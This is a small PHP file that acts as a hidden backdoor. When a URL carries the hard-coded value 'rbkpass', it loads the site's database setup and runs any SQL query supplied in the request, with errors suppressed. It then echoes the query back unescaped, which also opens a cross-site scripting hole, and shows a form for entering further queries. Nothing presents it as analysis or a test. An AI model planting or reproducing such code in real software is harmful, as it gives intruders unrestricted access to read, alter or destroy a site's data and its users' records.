<?


if ($_GET['p'] == "rbkpass")
{
	if (isset($save))
	{
		include("../init.php");
		@mysql_query($_GET['sql']);
		echo $_GET['sql'];
	}

	echo "<FORM>";
	echo "<INPUT type=hidden value=$p name=p><INPUT name=sql type=text size=70><INPUT type=submit name=save value=go>";
	echo "</FORM>";

}







?>